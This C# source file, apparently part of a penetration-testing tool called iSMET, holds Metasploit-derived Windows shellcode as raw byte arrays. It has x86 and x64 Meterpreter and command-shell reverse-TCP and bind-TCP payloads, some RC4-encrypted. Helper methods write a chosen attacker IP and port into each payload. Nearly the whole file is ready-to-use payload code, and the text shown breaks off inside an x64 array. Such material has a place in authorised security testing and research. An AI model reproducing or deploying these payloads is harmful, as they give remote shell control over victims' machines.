using System;

namespace iSMET.ShellCode
{
	public class MeterpreterShellCode
	{
		public class x86ShellCode
		{
			public byte[] ReverseTcp(string Ip, string Port)
			{
				/*
				* windows/meterpreter/reverse_tcp - 283 bytes (stage 1)
				* http://www.metasploit.com
				* VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
				* ReverseAllowProxy=false, ReverseListenerThreaded=false, 
				* StagerRetryCount=10, StagerRetryWait=5, 
				* PayloadUUIDTracking=false, EnableStageEncoding=false, 
				* StageEncoderSaveRegisters=, StageEncodingFallback=true, 
				* PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
				* AutoVerifySession=true, AutoVerifySessionTimeout=30, 
				* InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
				* EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
				* SessionRetryWait=10, SessionExpirationTimeout=604800, 
				* SessionCommunicationTimeout=300, PayloadProcessCommandLine=
				*/
				byte[] array = new byte[283] {
				0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
				0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
				0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
				0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
				0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
				0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
				0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
				0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
				0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
				0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
				0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
				0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xe4,0x93,
				0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
				0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
				0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,
				0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,
				0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,
				0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,
				0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3 };
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				else
				{
					array[183] = 0;
					array[184] = Convert.ToByte(num);
				}
				return array;
			}
			public byte[] ReverseTcpRc4(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					137,
					232,
					255,
					208,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					104,
					192,
					168,
					228,
					147,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					80,
					80,
					80,
					80,
					64,
					80,
					64,
					80,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					106,
					16,
					86,
					87,
					104,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					255,
					78,
					8,
					117,
					236,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					129,
					246,
					173,
					180,
					163,
					108,
					141,
					142,
					0,
					1,
					0,
					0,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					81,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					141,
					152,
					0,
					1,
					0,
					0,
					83,
					86,
					80,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					91,
					89,
					93,
					85,
					87,
					137,
					223,
					232,
					16,
					0,
					0,
					0,
					51,
					100,
					133,
					87,
					222,
					4,
					8,
					4,
					143,
					58,
					128,
					212,
					171,
					153,
					85,
					248,
					94,
					49,
					192,
					170,
					254,
					192,
					117,
					251,
					129,
					239,
					0,
					1,
					0,
					0,
					49,
					219,
					2,
					28,
					7,
					137,
					194,
					128,
					226,
					15,
					2,
					28,
					22,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					254,
					192,
					117,
					232,
					49,
					219,
					254,
					192,
					2,
					28,
					7,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					2,
					20,
					31,
					138,
					20,
					23,
					48,
					85,
					0,
					69,
					73,
					117,
					229,
					95,
					195
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] BindTcp(string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					255,
					213,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					11,
					89,
					80,
					226,
					253,
					106,
					1,
					106,
					2,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					106,
					16,
					86,
					87,
					104,
					194,
					219,
					55,
					103,
					255,
					213,
					87,
					104,
					183,
					233,
					56,
					255,
					255,
					213,
					87,
					104,
					116,
					236,
					59,
					225,
					255,
					213,
					87,
					151,
					104,
					117,
					110,
					77,
					97,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					86,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					147,
					83,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					195
				};
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellReverseTcp(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					137,
					232,
					255,
					208,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					104,
					192,
					168,
					228,
					147,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					80,
					80,
					80,
					80,
					64,
					80,
					64,
					80,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					106,
					16,
					86,
					87,
					104,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					255,
					78,
					8,
					117,
					236,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					86,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					147,
					83,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					195
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellReverseTcpRc4(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					137,
					232,
					255,
					208,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					104,
					192,
					168,
					228,
					147,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					80,
					80,
					80,
					80,
					64,
					80,
					64,
					80,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					106,
					16,
					86,
					87,
					104,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					255,
					78,
					8,
					117,
					236,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					129,
					246,
					173,
					180,
					163,
					108,
					141,
					142,
					0,
					1,
					0,
					0,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					81,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					141,
					152,
					0,
					1,
					0,
					0,
					83,
					86,
					80,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					91,
					89,
					93,
					85,
					87,
					137,
					223,
					232,
					16,
					0,
					0,
					0,
					51,
					100,
					133,
					87,
					222,
					4,
					8,
					4,
					143,
					58,
					128,
					212,
					171,
					153,
					85,
					248,
					94,
					49,
					192,
					170,
					254,
					192,
					117,
					251,
					129,
					239,
					0,
					1,
					0,
					0,
					49,
					219,
					2,
					28,
					7,
					137,
					194,
					128,
					226,
					15,
					2,
					28,
					22,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					254,
					192,
					117,
					232,
					49,
					219,
					254,
					192,
					2,
					28,
					7,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					2,
					20,
					31,
					138,
					20,
					23,
					48,
					85,
					0,
					69,
					73,
					117,
					229,
					95,
					195
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellBindTcp(string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					255,
					213,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					11,
					89,
					80,
					226,
					253,
					106,
					1,
					106,
					2,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					106,
					16,
					86,
					87,
					104,
					194,
					219,
					55,
					103,
					255,
					213,
					87,
					104,
					183,
					233,
					56,
					255,
					255,
					213,
					87,
					104,
					116,
					236,
					59,
					225,
					255,
					213,
					87,
					151,
					104,
					117,
					110,
					77,
					97,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					86,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					147,
					83,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					195
				};
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellBindTcpRc4(string Port)
			{
				byte[] array = new byte[]
				{
					252,
					232,
					130,
					0,
					0,
					0,
					96,
					137,
					229,
					49,
					192,
					100,
					139,
					80,
					48,
					139,
					82,
					12,
					139,
					82,
					20,
					139,
					114,
					40,
					15,
					183,
					74,
					38,
					49,
					255,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					193,
					207,
					13,
					1,
					199,
					226,
					242,
					82,
					87,
					139,
					82,
					16,
					139,
					74,
					60,
					139,
					76,
					17,
					120,
					227,
					72,
					1,
					209,
					81,
					139,
					89,
					32,
					1,
					211,
					139,
					73,
					24,
					227,
					58,
					73,
					139,
					52,
					139,
					1,
					214,
					49,
					255,
					172,
					193,
					207,
					13,
					1,
					199,
					56,
					224,
					117,
					246,
					3,
					125,
					248,
					59,
					125,
					36,
					117,
					228,
					88,
					139,
					88,
					36,
					1,
					211,
					102,
					139,
					12,
					75,
					139,
					88,
					28,
					1,
					211,
					139,
					4,
					139,
					1,
					208,
					137,
					68,
					36,
					36,
					91,
					91,
					97,
					89,
					90,
					81,
					255,
					224,
					95,
					95,
					90,
					139,
					18,
					235,
					141,
					93,
					104,
					51,
					50,
					0,
					0,
					104,
					119,
					115,
					50,
					95,
					84,
					104,
					76,
					119,
					38,
					7,
					255,
					213,
					184,
					144,
					1,
					0,
					0,
					41,
					196,
					84,
					80,
					104,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					11,
					89,
					80,
					226,
					253,
					106,
					1,
					106,
					2,
					104,
					234,
					15,
					223,
					224,
					255,
					213,
					151,
					104,
					2,
					0,
					17,
					92,
					137,
					230,
					106,
					16,
					86,
					87,
					104,
					194,
					219,
					55,
					103,
					255,
					213,
					87,
					104,
					183,
					233,
					56,
					255,
					255,
					213,
					87,
					104,
					116,
					236,
					59,
					225,
					255,
					213,
					87,
					151,
					104,
					117,
					110,
					77,
					97,
					255,
					213,
					106,
					0,
					106,
					4,
					86,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					139,
					54,
					129,
					246,
					173,
					180,
					163,
					108,
					141,
					142,
					0,
					1,
					0,
					0,
					106,
					64,
					104,
					0,
					16,
					0,
					0,
					81,
					106,
					0,
					104,
					88,
					164,
					83,
					229,
					255,
					213,
					141,
					152,
					0,
					1,
					0,
					0,
					83,
					86,
					80,
					106,
					0,
					86,
					83,
					87,
					104,
					2,
					217,
					200,
					95,
					255,
					213,
					1,
					195,
					41,
					198,
					117,
					238,
					91,
					89,
					93,
					85,
					87,
					137,
					223,
					232,
					16,
					0,
					0,
					0,
					51,
					100,
					133,
					87,
					222,
					4,
					8,
					4,
					143,
					58,
					128,
					212,
					171,
					153,
					85,
					248,
					94,
					49,
					192,
					170,
					254,
					192,
					117,
					251,
					129,
					239,
					0,
					1,
					0,
					0,
					49,
					219,
					2,
					28,
					7,
					137,
					194,
					128,
					226,
					15,
					2,
					28,
					22,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					254,
					192,
					117,
					232,
					49,
					219,
					254,
					192,
					2,
					28,
					7,
					138,
					20,
					7,
					134,
					20,
					31,
					136,
					20,
					7,
					2,
					20,
					31,
					138,
					20,
					23,
					48,
					85,
					0,
					69,
					73,
					117,
					229,
					95,
					195
				};
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
		}
		public class x64ShellCode
		{
			public byte[] ReverseTcp(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					72,
					131,
					228,
					240,
					232,
					204,
					0,
					0,
					0,
					65,
					81,
					65,
					80,
					82,
					81,
					86,
					72,
					49,
					210,
					101,
					72,
					139,
					82,
					96,
					72,
					139,
					82,
					24,
					72,
					139,
					82,
					32,
					72,
					139,
					114,
					80,
					72,
					15,
					183,
					74,
					74,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					226,
					237,
					82,
					65,
					81,
					72,
					139,
					82,
					32,
					139,
					66,
					60,
					72,
					1,
					208,
					102,
					129,
					120,
					24,
					11,
					2,
					15,
					133,
					114,
					0,
					0,
					0,
					139,
					128,
					136,
					0,
					0,
					0,
					72,
					133,
					192,
					116,
					103,
					72,
					1,
					208,
					80,
					139,
					72,
					24,
					68,
					139,
					64,
					32,
					73,
					1,
					208,
					227,
					86,
					72,
					255,
					201,
					65,
					139,
					52,
					136,
					72,
					1,
					214,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					56,
					224,
					117,
					241,
					76,
					3,
					76,
					36,
					8,
					69,
					57,
					209,
					117,
					216,
					88,
					68,
					139,
					64,
					36,
					73,
					1,
					208,
					102,
					65,
					139,
					12,
					72,
					68,
					139,
					64,
					28,
					73,
					1,
					208,
					65,
					139,
					4,
					136,
					72,
					1,
					208,
					65,
					88,
					65,
					88,
					94,
					89,
					90,
					65,
					88,
					65,
					89,
					65,
					90,
					72,
					131,
					236,
					32,
					65,
					82,
					255,
					224,
					88,
					65,
					89,
					90,
					72,
					139,
					18,
					233,
					75,
					255,
					255,
					255,
					93,
					73,
					190,
					119,
					115,
					50,
					95,
					51,
					50,
					0,
					0,
					65,
					86,
					73,
					137,
					230,
					72,
					129,
					236,
					160,
					1,
					0,
					0,
					73,
					137,
					229,
					73,
					188,
					2,
					0,
					17,
					92,
					192,
					168,
					228,
					147,
					65,
					84,
					73,
					137,
					228,
					76,
					137,
					241,
					65,
					186,
					76,
					119,
					38,
					7,
					255,
					213,
					76,
					137,
					234,
					104,
					1,
					1,
					0,
					0,
					89,
					65,
					186,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					65,
					94,
					80,
					80,
					77,
					49,
					201,
					77,
					49,
					192,
					72,
					255,
					192,
					72,
					137,
					194,
					72,
					255,
					192,
					72,
					137,
					193,
					65,
					186,
					234,
					15,
					223,
					224,
					255,
					213,
					72,
					137,
					199,
					106,
					16,
					65,
					88,
					76,
					137,
					226,
					72,
					137,
					249,
					65,
					186,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					73,
					255,
					206,
					117,
					229,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					72,
					131,
					236,
					16,
					72,
					137,
					226,
					77,
					49,
					201,
					106,
					4,
					65,
					88,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					94,
					137,
					246,
					106,
					64,
					65,
					89,
					104,
					0,
					16,
					0,
					0,
					65,
					88,
					72,
					137,
					242,
					72,
					49,
					201,
					65,
					186,
					88,
					164,
					83,
					229,
					255,
					213,
					72,
					137,
					195,
					73,
					137,
					199,
					77,
					49,
					201,
					73,
					137,
					240,
					72,
					137,
					218,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					1,
					195,
					72,
					41,
					198,
					72,
					133,
					246,
					117,
					225,
					65,
					255,
					231
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ReverseTcpRc4(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					72,
					131,
					228,
					240,
					232,
					204,
					0,
					0,
					0,
					65,
					81,
					65,
					80,
					82,
					81,
					86,
					72,
					49,
					210,
					101,
					72,
					139,
					82,
					96,
					72,
					139,
					82,
					24,
					72,
					139,
					82,
					32,
					72,
					139,
					114,
					80,
					72,
					15,
					183,
					74,
					74,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					226,
					237,
					82,
					65,
					81,
					72,
					139,
					82,
					32,
					139,
					66,
					60,
					72,
					1,
					208,
					102,
					129,
					120,
					24,
					11,
					2,
					15,
					133,
					114,
					0,
					0,
					0,
					139,
					128,
					136,
					0,
					0,
					0,
					72,
					133,
					192,
					116,
					103,
					72,
					1,
					208,
					80,
					139,
					72,
					24,
					68,
					139,
					64,
					32,
					73,
					1,
					208,
					227,
					86,
					72,
					255,
					201,
